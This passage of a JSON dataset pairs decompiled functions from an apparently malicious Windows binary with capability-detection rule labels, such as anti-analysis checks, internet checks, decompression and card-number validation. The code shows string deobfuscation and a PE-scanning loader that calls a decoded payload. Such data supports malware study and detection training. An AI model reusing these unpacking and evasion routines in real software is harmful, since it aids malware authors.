 } while (uStack64 < *(piStack56 + 9) >> 1 && (bVar4 && iVar3 != 0));\n                    if (bVar4) {\n                        return piStack56[4];\n                    }\n                }\n            }\n            piStack56 = *piStack56;\n        } while (piStack56 != piVar2);\n    }\n    return NULL;\n}\n",
        "token_count": 439
    },
    "00402d5b": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nint32_t __cdecl fcn.00402d5b(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t arg_8h_00;\n    uint arg_8h_01;\n    uint32_t uVar1;\n    uint32_t uStack88;\n    char acStack84 [32];\n    code *pcStack52;\n    int32_t iStack48;\n    int32_t iStack44;\n    uint32_t uStack28;\n    uint32_t uStack24;\n    uint var_bp_ch;\n    \n    uStack28 = 0x409fd0b8;\n    iStack48 = 0x3adbd32c;\n    uStack88 = 0;\n    do {\n        uVar1 = uStack28 ^ 0x409fd0b9;\n        uStack24 = 0x1c46446e << (uStack24 & 0x1f) ^ 0x650e5ace;\n        acStack84[uStack88] = *(uStack88 + 0x404139) - *((uStack88 & uStack28 + 0xbf602f4f) + 0x404247);\n        uStack88 = uStack88 + uVar1;\n    } while (uStack88 != 0xe);\n    iStack44 = 0;\n    if (acStack84[0] == 'V') {\n        arg_8h_01 = fcn.0040146b();\n        pcStack52 = fcn.00401dde(arg_8h_01, acStack84);\n        iStack44 = 0;\n        if ((0xff < pcStack52) && (iStack44 = 0,  0x5b869060 < iStack48 + 0x639f7fafU)) {\n            arg_8h_00 = (*pcStack52)(0, 0x40a140b8 - uStack28, 0x1000, uStack28 + 0xbf602f88);\n            iStack44 = 0;\n            if (arg_8h_00 != 0) {\n                fcn.004023af(arg_8h_00, arg_ch);\n                *(arg_8h + 0x54) = arg_8h_00;\n                *(arg_8h + 0x58) = arg_8h_00 + -0x400000;\n                iStack44 = arg_8h_00 + 0x4310;\n            }\n        }\n    }\n    return iStack44;\n}\n",
        "token_count": 564
    },
    "00401720": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/a90d4ac7cf5b4bde87d45a81715c7353",
            "validate payment card number using luhn algorithm with lookup table/6f7029bc2c134cb690df0e7c2f59f3d4"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_8h\n\nvoid __cdecl fcn.00401720(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    uint32_t uStack40;\n    uint var_bp_8h;\n    \n    uStack40 = 0;\n    if (arg_10h != 0) {\n        do {\n            *(arg_8h + uStack40) = *(arg_ch + uStack40) - *((uStack40 & 7) + 0x404247);\n            uStack40 = uStack40 + 1;\n        } while (uStack40 != arg_10h);\n    }\n    return;\n}\n",
        "token_count": 157
    },
    "004020a3": {
        "rules": [
            "decompress data using LZO/0e44f942d5744579a3d2494f64545baa"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nuint fcn.004020a3(void)\n\n{\n    code *pcVar1;\n    code *pcStack192;\n    uchar auStack168 [52];\n    uint uStack116;\n    uint uStack112;\n    int16_t *piStack92;\n    uint uStack88;\n    uint uStack68;\n    uint uStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    uint auStack48 [2];\n    uint uStack40;\n    uint32_t uStack32;\n    uint var_bp_ch;\n    \n    fcn.00402fbf(auStack48);\n    uStack116 = auStack48[0];\n    uStack112 = 0x11600;\n    uStack60 = *0x421cf4;\n    uStack56 = *0x421cf8;\n    uStack52 = *0x421cfc;\n    uStack64 = *0x421d00;\n    uStack68 = *0x421d04;\n    pcStack192 = fcn.00401abc;\n    do {\n        piStack92 = pcStack192;\n        if (*pcStack192 == 0x5a4d) {\n            if (*(pcStack192 + *(pcStack192 + 0x3c)) == 0x4550) {\n                uStack88 = *(pcStack192 + *(pcStack192 + 0x3c) + 0x50);\n                uStack32 = uStack32 ^ 0x65c6e5f6;\n                pcVar1 = fcn.00402d5b(auStack168, uStack40);\n                (*pcVar1)(auStack168);\n                return 1;\n            }\n        }\n        pcStack192 = pcStack192 + -0x1000 & 0xfffff000;\n    } while( true );\n}\n",
        "token_count": 412
    },
    "0040144d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040144d(uint arg_8h)\n\n{\n    uint arg_8h_00;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040146b();\n    fcn.00401dde(arg_8h_00, arg_8h);\n    return;\n}\n",
        "token_count": 74
    },
    "00401a70": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t fcn.00401a70(void)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_10h;\n    int32_t var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    iVar1 = *(in_FS_OFFSET + 0x18);\n    var_ch = -1;\n    if ((iVar1 != 0) && (var_ch = iVar1,  iVar1 == 1)) {\n        var_ch = 0;\n    }\n    return var_ch;\n}\n",
        "token_count": 119
    },
    "0040225f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040225f(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = 0;\n    if (*(arg_8h + *(arg_8h + 0x3c)) == 0x4550) {\n        iVar1 = arg_8h + *(arg_8h + 0x3c);\n    }\n    return iVar1;\n}\n",
        "token_count": 113
    },
    "00402b87": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_bp_ch\n\nvoid fcn.00402b87(void)\n\n{\n    uint8_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t uVar5;\n    bool bVar6;\n    int32_t iStack156;\n    int16_t aiStack144 [32];\n    char *pcStack80;\n    uint32_t uStack76;\n    char acStack72 [32];\n    uint32_t uStack40;\n    uint uStack36;\n    uint32_t uStack32;\n    uint32_t uStack28;\n    int32_t iStack24;\n    uint var_bp_ch;\n    \n    iStack24 = 0x2adff781;\n    pcStack80 = acStack72;\n    uVar5 = uStack32 << (uStack32 & 0x1f);\n    uVar1 = uStack32 & 0x1f;\n    uVar2 = uStack32 >> 0x20 - uVar1;\n    uVar3 = uStack32 & 0x20;\n    uStack32 = uVar5;\n    uStack28 = uStack28 << uVar1 | uVar2;\n    if (uVar3 != 0) {\n        uStack32 = 0;\n        uStack28 = uVar5;\n    }\n    acStack72[0] = '\\0';\n    uStack40 = 0;\n    do {\n        uStack76 = uStack40 & 7;\n        uStack36 = 0x5bffdafb;\n        iVar4 = iStack24 + -0x2adff780;\n        acStack72[uStack40] = *(uStack40 + 0x404108) - *(uStack76 + 0x404247);\n        uStack40 = uStack40 + iVar4;\n    } while (uStack40 != 0xb);\n    aiStack144[0] = 0;\n    iStack156 = 0;\n    do {\n        aiStack144[iStack156] = acStack72[iStack156];\n        *pcStack80 = '\\0';\n        iStack156 = iStack156 + 1;\n        bVar6 = 0x7165caeb < uStack32;\n        uStack32 = uStack32 + 0x8e9a3514;\n        uStack28 = (uStack28 - 1) + bVar6;\n    } while (iStack156 != 0x20);\n    fcn.004028d0(aiStack144, 0);\n    return;\n}\n",
        "token_count": 567
    },
    "00402f44": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00402f44(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_FS_OFFSET;\n    uint var_1ch;\n    int32_t var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    \n    iVar1 = *(in_FS_OFFSET + arg_8h);\n    var_18h = -1;\n    if ((iVar1 != 0) && (var_18h = iVar1,  iVar1 == 1)) {\n        var_18h = 0;\n    }\n    return var_18h;\n}\n",
        "token_count": 142
    }
}